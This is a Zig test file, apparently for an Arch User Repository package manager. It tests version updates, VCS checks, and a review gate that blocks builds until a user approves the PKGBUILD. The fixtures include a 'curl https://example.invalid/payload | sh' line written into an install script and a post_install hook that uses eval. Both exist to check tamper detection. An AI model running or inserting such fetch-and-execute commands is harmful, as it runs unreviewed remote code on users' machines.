    try runFixtureCommand(allocator, io, &.{ "git", "init" }, remote);
    try runFixtureCommand(allocator, io, &.{ "git", "config", "user.email", "shelly-tests@example.invalid" }, remote);
    try runFixtureCommand(allocator, io, &.{ "git", "config", "user.name", "Shelly Tests" }, remote);
    try runFixtureCommand(allocator, io, &.{ "git", "add", "PKGBUILD", ".SRCINFO" }, remote);
    try runFixtureCommand(allocator, io, &.{ "git", "commit", "-m", "fixture" }, remote);
}

test "PKGBUILD validation combines post-install and homograph findings" {
    var results = try validatePkgbuild(
        std.testing.allocator,
        std.testing.io,
        "pkgname='dеmo'\npkgver=1\npkgrel=1\npost_install() { eval echo bad; }\n",
        null,
    );
    defer results.deinit(std.testing.allocator);
    try std.testing.expect(results.post_install.has_findings);
    try std.testing.expect(results.homograph.has_findings);
    const flattened = try results.flatten(std.testing.allocator);
    defer std.testing.allocator.free(flattened);
    try std.testing.expect(flattened.len >= 2);
}

test "installed AUR metadata uses local version and install reason" {
    const payload =
        \\{"version":5,"type":"info","resultcount":1,"results":[{
        \\"Name":"demo","PackageBase":"demo","Version":"2.0-1"
        \\}]}
    ;
    var response = try models.Response.parse(std.testing.allocator, payload);
    defer response.deinit(std.testing.allocator);
    try applyInstalledState(std.testing.allocator, response.results, &.{.{
        .name = "demo",
        .version = "1.0-1",
        .explicit = true,
    }});
    try std.testing.expectEqualStrings("1.0-1", response.results[0].version);
    try std.testing.expect(response.results[0].explicit);
}

test "AUR update projection compares remote and installed versions" {
    const payload =
        \\{"version":5,"type":"info","resultcount":2,"results":[
        \\{"Name":"newer","PackageBase":"newer","Version":"2.0-1","Description":"update"},
        \\{"Name":"same","PackageBase":"same","Version":"1.0-1"}
        \\]}
    ;
    var response = try models.Response.parse(std.testing.allocator, payload);
    defer response.deinit(std.testing.allocator);
    const updates = try collectVersionUpdates(std.testing.allocator, &.{
        .{ .name = "newer", .version = "1.0-1", .explicit = true },
        .{ .name = "same", .version = "1.0-1", .explicit = false },
    }, response.results);
    defer models.Update.deinitSlice(std.testing.allocator, updates);
    try std.testing.expectEqual(@as(usize, 1), updates.len);
    try std.testing.expectEqualStrings("newer", updates[0].name);
    try std.testing.expectEqualStrings("1.0-1", updates[0].version);
    try std.testing.expectEqualStrings("2.0-1", updates[0].new_version);
}

test "AUR git remote and VCS suffix parsing mirror the C# manager" {
    const package_base = (try parseAurGitRemote(std.testing.allocator, "https://aur.archlinux.org/split-base.git\n")).?;
    defer std.testing.allocator.free(package_base);
    try std.testing.expectEqualStrings("split-base", package_base);
    try std.testing.expect((try parseAurGitRemote(std.testing.allocator, "ssh://aur@aur.archlinux.org/demo.git")) == null);
    try std.testing.expect(isVcsPackage("demo-GIT"));
    try std.testing.expect(!isVcsPackage("demo"));
    try std.testing.expect(hasNoBinRemapSuffix("demo-bin"));
}

test "helper cache identity recognizes installed split-package members" {
    const package_names = [_][]const u8{ "demo-cli", "demo-ui" };
    try std.testing.expect(cloneIdentityMatches("demo-suite", &package_names, "demo-ui"));
    try std.testing.expect(cloneIdentityMatches("demo-suite", &package_names, "demo-suite"));
    try std.testing.expect(!cloneIdentityMatches("demo-suite", &package_names, "unrelated"));
}

test "review digest covers exact local source contents and missing sources fail closed" {
    var temporary = std.testing.tmpDir(.{});
    defer temporary.cleanup();
    try temporary.dir.writeFile(std.testing.io, .{
        .sub_path = "PKGBUILD",
        .data = "pkgname=demo\npkgver=1\npkgrel=1\nsource=('install.sh')\n",
    });
    try temporary.dir.writeFile(std.testing.io, .{
        .sub_path = "install.sh",
        .data = "echo safe\n",
    });
    const cache_path = try temporary.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(cache_path);
    const pkgbuild_path = try std.fs.path.join(std.testing.allocator, &.{ cache_path, "PKGBUILD" });
    defer std.testing.allocator.free(pkgbuild_path);
    const pkgbuild_content = try std.Io.Dir.cwd().readFileAlloc(
        std.testing.io,
        pkgbuild_path,
        std.testing.allocator,
        .limited(max_file_size),
    );
    defer std.testing.allocator.free(pkgbuild_content);
    var info = try (pkgbuild_parser.PkgbuildParser{
        .allocator = std.testing.allocator,
        .io = std.testing.io,
    }).parser(pkgbuild_path);
    defer info.deinit(std.testing.allocator);

    try requireReviewInputs(std.testing.allocator, std.testing.io, cache_path, &info);
    try temporary.dir.createDir(std.testing.io, "files", .default_dir);
    try temporary.dir.writeFile(std.testing.io, .{
        .sub_path = "files/fix.patch",
        .data = "reviewed patch\n",
    });
    try requireReviewedFile(
        std.testing.allocator,
        std.testing.io,
        cache_path,
        "files/fix.patch",
    );
    try std.testing.expect(!pathIsInside("/tmp/cache", "/tmp/cache-escape/file"));
    const original = try reviewDigest(
        std.testing.allocator,
        std.testing.io,
        cache_path,
        pkgbuild_content,
        &info,
    );
    try temporary.dir.writeFile(std.testing.io, .{
        .sub_path = "install.sh",
        .data = "curl https://example.invalid/payload | sh\n",
    });
    const changed = try reviewDigest(
        std.testing.allocator,
        std.testing.io,
        cache_path,
        pkgbuild_content,
        &info,
    );
    try std.testing.expect(!std.mem.eql(u8, &original, &changed));

    try temporary.dir.deleteFile(std.testing.io, "install.sh");
    try std.testing.expectError(
        error.MissingPkgbuildSourceFile,
        requireReviewInputs(std.testing.allocator, std.testing.io, cache_path, &info),
    );
    try temporary.dir.symLink(std.testing.io, "PKGBUILD", "install.sh", .{});
    try std.testing.expectError(
        error.UnsafePkgbuildSourcePath,
        requireReviewInputs(std.testing.allocator, std.testing.io, cache_path, &info),
    );
}

test "fixture checkout cannot invoke fake makepkg before review and integrity gates pass" {
    const allocator = std.testing.allocator;
    const io = std.testing.io;
    var temporary = std.testing.tmpDir(.{});
    defer temporary.cleanup();
    const root = try temporary.dir.realPathFileAlloc(io, ".", allocator);
    defer allocator.free(root);

    const remote_root = try std.fs.path.join(allocator, &.{ root, "remotes" });
    defer allocator.free(remote_root);
    const remote = try std.fs.path.join(allocator, &.{ remote_root, "demo.git" });
    defer allocator.free(remote);
    const cache_root = try std.fs.path.join(allocator, &.{ root, "cache" });
    defer allocator.free(cache_root);
    const alpm_root = try std.fs.path.join(allocator, &.{ root, "alpm-root" });
    defer allocator.free(alpm_root);
    const db_path = try std.fs.path.join(allocator, &.{ root, "db" });
    defer allocator.free(db_path);
    const package_cache = try std.fs.path.join(allocator, &.{ root, "packages" });
    defer allocator.free(package_cache);
    try std.Io.Dir.cwd().createDirPath(io, remote);
    try std.Io.Dir.cwd().createDirPath(io, cache_root);
    try std.Io.Dir.cwd().createDirPath(io, alpm_root);
    try std.Io.Dir.cwd().createDirPath(io, db_path);
    try std.Io.Dir.cwd().createDirPath(io, package_cache);

    const pkgbuild_path = try std.fs.path.join(allocator, &.{ remote, "PKGBUILD" });
    defer allocator.free(pkgbuild_path);
    const source_path = try std.fs.path.join(allocator, &.{ remote, "helper.sh" });
    defer allocator.free(source_path);
    const srcinfo_path = try std.fs.path.join(allocator, &.{ remote, ".SRCINFO" });
    defer allocator.free(srcinfo_path);
    try writeFixtureFile(
        io,
        pkgbuild_path,
        "pkgname=demo\npkgver=1\npkgrel=1\narch=('any')\nsource=('helper.sh')\nsha256sums=('SKIP')\npackage() { install -Dm755 helper.sh \"$pkgdir/usr/bin/demo\"; }\n",
        false,
    );
    try writeFixtureFile(io, source_path, "#!/bin/sh\necho reviewed\n", false);
    try writeFixtureFile(
        io,
        srcinfo_path,
        "pkgbase = demo\n\tpkgdesc = review fixture\n\tpkgver = 1-1\n\tarch = any\n\tsource = helper.sh\n\tsha256sums = SKIP\npkgname = demo\n",
        false,
    );
    try runFixtureCommand(allocator, io, &.{ "git", "init" }, remote);
    try runFixtureCommand(allocator, io, &.{ "git", "config", "user.email", "shelly-tests@example.invalid" }, remote);
    try runFixtureCommand(allocator, io, &.{ "git", "config", "user.name", "Shelly Tests" }, remote);
    try runFixtureCommand(allocator, io, &.{ "git", "add", "PKGBUILD", ".SRCINFO", "helper.sh" }, remote);
    try runFixtureCommand(allocator, io, &.{ "git", "commit", "-m", "fixture" }, remote);

    const marker_path = try std.fs.path.join(allocator, &.{ root, "makepkg-invoked" });
    defer allocator.free(marker_path);
    const fake_makepkg_path = try std.fs.path.join(allocator, &.{ root, "fake-makepkg" });
    defer allocator.free(fake_makepkg_path);
    const fake_makepkg = try std.fmt.allocPrint(
        allocator,
        "#!/bin/sh\n: > \"{s}\"\n",
        .{marker_path},
    );
    defer allocator.free(fake_makepkg);
    try writeFixtureFile(io, fake_makepkg_path, fake_makepkg, true);

    const config_path = try std.fs.path.join(allocator, &.{ root, "pacman.conf" });
    defer allocator.free(config_path);
    const config = try std.fmt.allocPrint(
        allocator,
        "[options]\nArchitecture = auto\nSigLevel = Never\nRootDir = {s}\nDBPath = {s}\nCacheDir = {s}\n",
        .{ alpm_root, db_path, package_cache },
    );
    defer allocator.free(config);
    try writeFixtureFile(io, config_path, config, false);

    var manager = try Manager.init(allocator, std.testing.environ, .{
        .config_path = config_path,
        .cache_root = cache_root,
        .aur_git_base_url = remote_root,
        .makepkg_command = fake_makepkg_path,
    });
    defer manager.deinit();
    _ = try manager.cachePkgbase("demo", "demo");

    const Approval = struct {
        accepted: bool,
        calls: usize = 0,

        fn answer(data: ?*anyopaque, request: PkgbuildDiffRequest) bool {
            const self: *@This() = @ptrCast(@alignCast(data));
            self.calls += 1;
            std.debug.assert(std.mem.eql(u8, request.package_name, "demo"));
            std.debug.assert(request.source_files.contains("helper.sh"));
            return self.accepted;
        }
    };
    var approval = Approval{ .accepted = false };
    manager.setPkgbuildApprovalHandler(.{ .function = Approval.answer, .data = &approval });

    var prepared = try manager.preparePackageForBuild("demo", null);
    defer prepared.deinit(allocator);
    try std.testing.expectError(
        error.PkgbuildReviewDeclined,
        manager.buildPreparedPackage(&prepared, false),
    );
    try std.testing.expectEqual(@as(usize, 1), approval.calls);
    try std.testing.expectError(error.FileNotFound, std.Io.Dir.cwd().access(io, marker_path, .{}));

    approval.accepted = true;
    try manager.requirePkgbuildApproval(&prepared);
    try std.testing.expectEqual(@as(usize, 2), approval.calls);
    const checkout_source = try std.fs.path.join(allocator, &.{ prepared.cache_path, "helper.sh" });
    defer allocator.free(checkout_source);
    try writeFixtureFile(io, checkout_source, "#!/bin/sh\necho changed-after-review\n", false);
    try std.testing.expectError(
        error.ReviewedCheckoutChanged,
        manager.buildPreparedPackage(&prepared, false),
    );
    try std.testing.expectError(error.FileNotFound, std.Io.Dir.cwd().access(io, marker_path, .{}));

    approval.accepted = false;
    var changed_prepared = try manager.preparePackageForBuild("demo", null);
    defer changed_prepared.deinit(allocator);
    try std.testing.expectError(
        error.PkgbuildReviewDeclined,
        manager.buildPreparedPackage(&changed_prepared, false),
    );
    try std.testing.expectEqual(@as(usize, 3), approval.calls);
    try std.testing.expectError(error.FileNotFound, std.Io.Dir.cwd().access(io, marker_path, .{}));

    try writeFixtureFile(io, checkout_source, "#!/bin/sh\necho reviewed\n", false);
    try std.testing.expect(try manager.buildPreparedPackage(&prepared, false));
    try std.Io.Dir.cwd().access(io, marker_path, .{});
}

test "all requested PKGBUILDs are reviewed before the first build" {
    const allocator = std.testing.allocator;
    const io = std.testing.io;
    var temporary = std.testing.tmpDir(.{});
    defer temporary.cleanup();
    const root = try temporary.dir.realPathFileAlloc(io, ".", allocator);
    defer allocator.free(root);

    const remote_root = try std.fs.path.join(allocator, &.{ root, "remotes" });
    defer allocator.free(remote_root);
    const cache_root = try std.fs.path.join(allocator, &.{ root, "cache" });
    defer allocator.free(cache_root);
    const alpm_root = try std.fs.path.join(allocator, &.{ root, "alpm-root" });
    defer allocator.free(alpm_root);
    const db_path = try std.fs.path.join(allocator, &.{ root, "db" });
    defer allocator.free(db_path);
    const package_cache = try std.fs.path.join(allocator, &.{ root, "packages" });
    defer allocator.free(package_cache);
    try std.Io.Dir.cwd().createDirPath(io, remote_root);
    try std.Io.Dir.cwd().createDirPath(io, cache_root);
    try std.Io.Dir.cwd().createDirPath(io, alpm_root);
    try std.Io.Dir.cwd().createDirPath(io, db_path);
    try std.Io.Dir.cwd().createDirPath(io, package_cache);
    try createAurFixtureRepository(allocator, io, remote_root, "review-one", null);
    try createAurFixtureRepository(allocator, io, remote_root, "review-two", "review-dependency-git");
    try createAurFixtureRepository(allocator, io, remote_root, "review-dependency-git", null);
    try createSplitAurFixtureRepository(
        allocator,
        io,
        remote_root,
        "review-suite",
        &.{ "review-suite", "review-suite-addon" },
    );

    const marker_path = try std.fs.path.join(allocator, &.{ root, "makepkg-invoked" });
    defer allocator.free(marker_path);
    const fake_makepkg_path = try std.fs.path.join(allocator, &.{ root, "fake-makepkg" });
    defer allocator.free(fake_makepkg_path);
    const fake_makepkg = try std.fmt.allocPrint(
        allocator,
        "#!/bin/sh\nprintf x >> \"{s}\"\nexit 1\n",
        .{marker_path},
    );
    defer allocator.free(fake_makepkg);
    try writeFixtureFile(io, fake_makepkg_path, fake_makepkg, true);

    const config_path = try std.fs.path.join(allocator, &.{ root, "pacman.conf" });
    defer allocator.free(config_path);
    const config = try std.fmt.allocPrint(
        allocator,
        "[options]\nArchitecture = auto\nSigLevel = Never\nRootDir = {s}\nDBPath = {s}\nCacheDir = {s}\n",
        .{ alpm_root, db_path, package_cache },
    );
    defer allocator.free(config);
    try writeFixtureFile(io, config_path, config, false);

    var manager = try Manager.init(allocator, std.testing.environ, .{
        .config_path = config_path,
        .cache_root = cache_root,
        .aur_git_base_url = remote_root,
        .makepkg_command = fake_makepkg_path,
    });
    defer manager.deinit();
    _ = try manager.cachePkgbase("review-one", "review-one");
    _ = try manager.cachePkgbase("review-two", "review-two");
    _ = try manager.cachePkgbase("review-dependency-git", "review-dependency-git");
    _ = try manager.cachePkgbase("review-suite", "review-suite");
    _ = try manager.cachePkgbase("review-suite-addon", "review-suite");

    const Approval = struct {
        marker_path: []const u8,
        calls: usize = 0,
        build_started_during_review: bool = false,
        accepted: bool = true,

        fn answer(data: ?*anyopaque, _: PkgbuildDiffRequest) bool {
            const self: *@This() = @ptrCast(@alignCast(data));
            self.calls += 1;
            std.Io.Dir.cwd().access(std.testing.io, self.marker_path, .{}) catch return self.accepted;
            self.build_started_during_review = true;
            return self.accepted;
        }
    };
    var approval = Approval{ .marker_path = marker_path };
    manager.setPkgbuildApprovalHandler(.{ .function = Approval.answer, .data = &approval });

    var split_plans = try manager.prepareInstallPlans(&.{
        "review-suite",
        "review-suite-addon",
        "review-suite",
    });
    defer {
        for (split_plans.items) |*plan| plan.deinit(allocator);
        split_plans.deinit(allocator);
    }
    try std.testing.expectEqual(@as(usize, 1), split_plans.items.len);
    try std.testing.expectEqualStrings("review-suite", split_plans.items[0].prepared.package_base);
    try std.testing.expectEqual(@as(usize, 2), split_plans.items[0].requested_names.items.len);
    try std.testing.expectEqualStrings("review-suite", split_plans.items[0].requested_names.items[0]);
    try std.testing.expectEqualStrings("review-suite-addon", split_plans.items[0].requested_names.items[1]);

    try manager.installPackages(&.{ "review-suite", "review-suite-addon" });
    const split_build_marker = try std.Io.Dir.cwd().readFileAlloc(
        io,
        marker_path,
        allocator,
        .limited(16),
    );
    defer allocator.free(split_build_marker);
    try std.testing.expectEqualStrings("x", split_build_marker);
    try std.Io.Dir.cwd().deleteFile(io, marker_path);
    approval.calls = 0;

    try std.testing.expectError(
        error.BuildFailed,
        manager.installPackages(&.{ "review-one", "review-one", "review-two" }),
    );

    try std.testing.expectEqual(@as(usize, 3), approval.calls);
    try std.testing.expect(!approval.build_started_during_review);
    try std.Io.Dir.cwd().access(io, marker_path, .{});

    const first_remote = try std.fs.path.join(allocator, &.{ remote_root, "review-one.git" });
    defer allocator.free(first_remote);
    const first_pkgbuild = try std.fs.path.join(allocator, &.{ first_remote, "PKGBUILD" });
    defer allocator.free(first_pkgbuild);
    try writeFixtureFile(
        io,
        first_pkgbuild,
        "pkgname=review-one\npkgver=1\npkgrel=1\narch=('any')\n# changed for a new review\npackage() { :; }\n",
        false,
    );
    try runFixtureCommand(allocator, io, &.{ "git", "add", "PKGBUILD" }, first_remote);
    try runFixtureCommand(allocator, io, &.{ "git", "commit", "-m", "review change" }, first_remote);
    try std.Io.Dir.cwd().deleteFile(io, marker_path);
    approval.accepted = false;

    try std.testing.expectError(
        error.PkgbuildReviewDeclined,
        manager.installPackages(&.{"review-one"}),
    );
    try std.testing.expectEqual(@as(usize, 4), approval.calls);
    try std.testing.expectError(error.FileNotFound, std.Io.Dir.cwd().access(io, marker_path, .{}));

    const FailureCapture = struct {
        count: usize = 0,

        fn handle(data: ?*anyopaque, event: operation_api.Event) void {
            const self: *@This() = @ptrCast(@alignCast(data.?));
            if (event == .failure) self.count += 1;
        }
    };
    var operation_context = operation_api.OperationContext.init(allocator, io);
    defer operation_context.deinit();
    var failure_capture: FailureCapture = .{};
    const subscription = try operation_context.subscribe(.{
        .function = FailureCapture.handle,
        .data = &failure_capture,
    });
    defer _ = operation_context.unsubscribe(subscription);
    manager.setOperationContext(&operation_context);
    defer manager.setOperationContext(null);
    _ = try manager.cachePkgbase("missing-review-fixture", "missing-review-fixture");
    try std.testing.expectError(
        error.DownloadFailed,
        manager.updatePackages(&.{"missing-review-fixture"}),
    );
    try std.testing.expectEqual(@as(usize, 1), failure_capture.count);
}

test "AUR package failures are emitted after all builds and fail the operation" {
    const allocator = std.testing.allocator;
    const io = std.testing.io;
    var temporary = std.testing.tmpDir(.{});
    defer temporary.cleanup();
    const root = try temporary.dir.realPathFileAlloc(io, ".", allocator);
    defer allocator.free(root);

    const remote_root = try std.fs.path.join(allocator, &.{ root, "remotes" });
    defer allocator.free(remote_root);
    const cache_root = try std.fs.path.join(allocator, &.{ root, "cache" });
    defer allocator.free(cache_root);
    const alpm_root = try std.fs.path.join(allocator, &.{ root, "alpm-root" });
    defer allocator.free(alpm_root);
    const db_path = try std.fs.path.join(allocator, &.{ root, "db" });
    defer allocator.free(db_path);
    const package_cache = try std.fs.path.join(allocator, &.{ root, "packages" });
    defer allocator.free(package_cache);
    try std.Io.Dir.cwd().createDirPath(io, remote_root);
    try std.Io.Dir.cwd().createDirPath(io, cache_root);
    try std.Io.Dir.cwd().createDirPath(io, alpm_root);
    try std.Io.Dir.cwd().createDirPath(io, db_path);
    try std.Io.Dir.cwd().createDirPath(io, package_cache);
    try createAurFixtureRepository(allocator, io, remote_root, "failure-one", null);
    try createAurFixtureRepository(allocator, io, remote_root, "failure-two", null);

    const fake_makepkg_path = try std.fs.path.join(allocator, &.{ root, "fake-makepkg" });
    defer allocator.free(fake_makepkg_path);
    try writeFixtureFile(io, fake_makepkg_path, "#!/bin/sh\nexit 1\n", true);

    const config_path = try std.fs.path.join(allocator, &.{ root, "pacman.conf" });
    defer allocator.free(config_path);
    const config = try std.fmt.allocPrint(
        allocator,
        "[options]\nArchitecture = auto\nSigLevel = Never\nRootDir = {s}\nDBPath = {s}\nCacheDir = {s}\n",
        .{ alpm_root, db_path, package_cache },
    );
    defer allocator.free(config);
    try writeFixtureFile(io, config_path, config, false);

    var operation_context = operation_api.OperationContext.init(allocator, io);
    defer operation_context.deinit();
    operation_context.setQuestionHandler(.{
        .function = struct {
            fn answer(_: ?*anyopaque, question: operation_api.Question) operation_api.QuestionResponse {
                return switch (question.kind) {
                    .review_changes, .confirm_transaction => .accepted,
                    else => .default,
                };
            }
        }.answer,
    });

    const Capture = struct {
        expected_kind: operation_api.OperationKind = .install,
        build_starts: usize = 0,
        failure_statuses: usize = 0,
        failure_progress: usize = 0,
        failure_one: usize = 0,
        failure_two: usize = 0,
        emitted_before_all_builds: bool = false,
        completion_before_failures: bool = false,
        completion: ?operation_api.CompletionStatus = null,

        fn reset(self: *@This(), kind: operation_api.OperationKind) void {
            self.* = .{ .expected_kind = kind };
        }

        fn handle(data: ?*anyopaque, event: operation_api.Event) void {
            const self: *@This() = @ptrCast(@alignCast(data.?));
            const envelope = switch (event) {
                inline else => |payload| payload.envelope,
            };
            if (envelope.backend != .aur or
                envelope.kind != self.expected_kind or
                envelope.parent_id != null) return;

            switch (event) {
                .status => |status| {
                    const code = status.code orelse return;
                    if (std.mem.eql(u8, code, "aur_build_start")) {
                        self.build_starts += 1;
                    } else if (std.mem.eql(u8, code, "aur_package_failed")) {
                        self.failure_statuses += 1;
                        if (self.build_starts != 2) self.emitted_before_all_builds = true;
                        std.debug.assert(std.mem.eql(u8, status.message, "Failed to build package"));
                    }
                },
                .progress => |progress| {
                    const stage = progress.update.stage orelse return;
                    if (!std.mem.eql(u8, stage, "aur_package_failed")) return;
                    self.failure_progress += 1;
                    if (self.build_starts != 2) self.emitted_before_all_builds = true;
                    const name = progress.update.message orelse return;
                    if (std.mem.eql(u8, name, "failure-one")) self.failure_one += 1;
                    if (std.mem.eql(u8, name, "failure-two")) self.failure_two += 1;
                },
                .completed => |completed| {
                    self.completion = completed.status;
                    self.completion_before_failures = self.failure_statuses != 2 or self.failure_progress != 2;
                },
                else => {},
            }
        }
    };
    var capture: Capture = .{};
    const subscription = try operation_context.subscribe(.{
        .function = Capture.handle,
        .data = &capture,
    });
    defer _ = operation_context.unsubscribe(subscription);

    var manager = try Manager.init(allocator, std.testing.environ, .{
        .config_path = config_path,
        .cache_root = cache_root,
        .aur_git_base_url = remote_root,
        .makepkg_command = fake_makepkg_path,
    });
    defer manager.deinit();
    manager.setOperationContext(&operation_context);
    defer manager.setOperationContext(null);
    _ = try manager.cachePkgbase("failure-one", "failure-one");
    _ = try manager.cachePkgbase("failure-two", "failure-two");

    const package_names = &.{ "failure-one", "failure-two" };
    try manager.installPackages(package_names);
    try std.testing.expectEqual(@as(usize, 2), capture.build_starts);
    try std.testing.expectEqual(@as(usize, 2), capture.failure_statuses);
    try std.testing.expectEqual(@as(usize, 2), capture.failure_progress);
    try std.testing.expectEqual(@as(usize, 1), capture.failure_one);
    try std.testing.expectEqual(@as(usize, 1), capture.failure_two);
    try std.testing.expect(!capture.emitted_before_all_builds);
    try std.testing.expect(!capture.completion_before_failures);
    try std.testing.expectEqual(operation_api.CompletionStatus.failed, capture.completion.?);

    capture.reset(.update);
    try manager.updatePackages(package_names);
    try std.testing.expectEqual(@as(usize, 2), capture.build_starts);
    try std.testing.expectEqual(@as(usize, 2), capture.failure_statuses);
    try std.testing.expectEqual(@as(usize, 2), capture.failure_progress);
    try std.testing.expectEqual(@as(usize, 1), capture.failure_one);
    try std.testing.expectEqual(@as(usize, 1), capture.failure_two);
    try std.testing.expect(!capture.emitted_before_all_builds);
    try std.testing.expect(!capture.completion_before_failures);
    try std.testing.expectEqual(operation_api.CompletionStatus.failed, capture.completion.?);
}

test "AUR operation-hooked public APIs compile" {
    var run = false;
    std.mem.doNotOptimizeAway(&run);
    if (!run) return;

    const manager: *Manager = undefined;
    _ = try manager.getInstalledPackages();
    _ = try manager.searchPackages("demo");
    _ = try manager.getPackagesNeedingUpdate(false);
    try manager.updatePackages(&.{"demo"});
    _ = try manager.fetchPkgbuild("demo");
    try manager.installDependenciesOnly("demo", true);
    try manager.installPackages(&.{"demo"});
    try manager.removePackages(&.{"demo"}, .{}, false);
    try manager.installPackageVersion("demo", "deadbeef");
}

test "VCS package checks execute concurrently and retain per-package results" {
    const Probe = struct {
        active: std.atomic.Value(usize) = .init(0),
        peak: std.atomic.Value(usize) = .init(0),

        fn fetch(
            data: ?*anyopaque,
            io: std.Io,
            _: std.process.Environ,
            _: []const u8,
            _: []const u8,
        ) anyerror!?RemoteSha {
            const probe: *@This() = @ptrCast(@alignCast(data));
            const active = probe.active.fetchAdd(1, .monotonic) + 1;
            defer _ = probe.active.fetchSub(1, .monotonic);
            var observed = probe.peak.load(.monotonic);
            while (active > observed) {
                if (probe.peak.cmpxchgWeak(observed, active, .monotonic, .monotonic)) |actual| {
                    observed = actual;
                } else break;
            }
            std.Io.Clock.Duration.sleep(.{
                .clock = .awake,
                .raw = .fromMilliseconds(20),
            }, io) catch {};
            return RemoteSha.fromSlice("new");
        }
    };

    var first_url = [_]u8{'1'};
    var second_url = [_]u8{'2'};
    var first_branch: [0]u8 = .{};
    var second_branch: [0]u8 = .{};
    var first_protocols: [0][]u8 = .{};
    var second_protocols: [0][]u8 = .{};
    var first_commit = [_]u8{ 'o', 'l', 'd' };
    var second_commit = [_]u8{ 'o', 'l', 'd' };
    var first_entries = [_]vcs.SourceEntry{.{
        .url = &first_url,
        .branch = &first_branch,
        .protocols = &first_protocols,
        .commit_sha = &first_commit,
    }};
    var second_entries = [_]vcs.SourceEntry{.{
        .url = &second_url,
        .branch = &second_branch,
        .protocols = &second_protocols,
        .commit_sha = &second_commit,
    }};
    var first_remote = [_]RemoteSha{.{}};
    var second_remote = [_]RemoteSha{.{}};
    var candidates = [_]VcsCheckCandidate{
        .{
            .package_name = "first-git",
            .installed_index = 0,
            .entries = &first_entries,
            .owned_entries = null,
            .remote_shas = &first_remote,
            .first_seen = false,
        },
        .{
            .package_name = "second-git",
            .installed_index = 1,
            .entries = &second_entries,
            .owned_entries = null,
            .remote_shas = &second_remote,
            .first_seen = false,
        },
    };
    var probe = Probe{};
    runVcsChecksConcurrently(std.testing.io, .empty, &candidates, .{
        .function = Probe.fetch,
        .data = &probe,
    });

    try std.testing.expect(probe.peak.load(.monotonic) >= 2);
    try std.testing.expect(candidates[0].needs_update);
    try std.testing.expect(candidates[1].needs_update);
    try std.testing.expectEqualStrings("new", candidates[0].remote_shas[0].slice());
    try std.testing.expectEqualStrings("new", candidates[1].remote_shas[0].slice());

    var changed = [_]RemoteSha{RemoteSha.fromSlice("dcaed638f1a486650c67063543708cf1313dfb14").?};
    try std.testing.expect(firstSeenVcsNeedsUpdate("0.46.r29.g34c6095-1", &changed));
    try std.testing.expect(!firstSeenVcsNeedsUpdate("26.36.0602723.r6.gdcaed63-1", &changed));
    try std.testing.expect(!firstSeenVcsNeedsUpdate("0.46-1", &changed));

    var unavailable = [_]RemoteSha{.{}};
    try std.testing.expect(!firstSeenVcsNeedsUpdate("0.46.r29.g34c6095-1", &unavailable));
}

test "VCS checks retry and baseline transiently failed sources" {
    const Probe = struct {
        sha: ?[]const u8,
        calls: usize = 0,

        fn fetch(
            data: ?*anyopaque,
            _: std.Io,
            _: std.process.Environ,
            _: []const u8,
            _: []const u8,
        ) anyerror!?RemoteSha {
            const probe: *@This() = @ptrCast(@alignCast(data));
            probe.calls += 1;
            return if (probe.sha) |sha| RemoteSha.fromSlice(sha) else null;
        }
    };

    var source = (try vcs.parseSource(
        std.testing.allocator,
        "git+https://example.invalid/demo.git",
        null,
    )).?;
    defer source.deinit(std.testing.allocator);
    var store = vcs.Store.init(std.testing.allocator);
    defer store.deinit();
    try store.set("demo-git", &.{source});

    var failed_probe = Probe{ .sha = null };
    var failed_candidate = try VcsCheckCandidate.init(
        std.testing.allocator,
        "demo-git",
        0,
        store.get("demo-git"),
        null,
    );
    defer failed_candidate.deinit(std.testing.allocator);
    runVcsCheck(std.testing.io, .empty, &failed_candidate, .{
        .function = Probe.fetch,
        .data = &failed_probe,
    });
    try std.testing.expectEqual(@as(usize, 1), failed_probe.calls);
    try std.testing.expect(!failed_candidate.needs_update);
    try std.testing.expect(!(try backfillMissingVcsBaselines(&store, &failed_candidate)));
    try std.testing.expectEqualStrings("", store.get("demo-git")[0].commit_sha);

    var baseline_probe = Probe{ .sha = "baseline" };
    var baseline_candidate = try VcsCheckCandidate.init(
        std.testing.allocator,
        "demo-git",
        0,
        store.get("demo-git"),
        null,
    );
    defer baseline_candidate.deinit(std.testing.allocator);
    runVcsCheck(std.testing.io, .empty, &baseline_candidate, .{
        .function = Probe.fetch,
        .data = &baseline_probe,
    });
    try std.testing.expectEqual(@as(usize, 1), baseline_probe.calls);
    try std.testing.expect(!baseline_candidate.needs_update);
    try std.testing.expect(try backfillMissingVcsBaselines(&store, &baseline_candidate));
    try std.testing.expectEqualStrings("baseline", store.get("demo-git")[0].commit_sha);

    var changed_probe = Probe{ .sha = "changed" };
    var changed_candidate = try VcsCheckCandidate.init(
        std.testing.allocator,
        "demo-git",
        0,
        store.get("demo-git"),
        null,
    );
    defer changed_candidate.deinit(std.testing.allocator);
    runVcsCheck(std.testing.io, .empty, &changed_candidate, .{
        .function = Probe.fetch,
        .data = &changed_probe,
    });
    try std.testing.expect(changed_candidate.needs_update);
    try std.testing.expect(!(try backfillMissingVcsBaselines(&store, &changed_candidate)));
    try std.testing.expectEqualStrings("baseline", store.get("demo-git")[0].commit_sha);
}

test {
    std.testing.refAllDecls(@This());
}
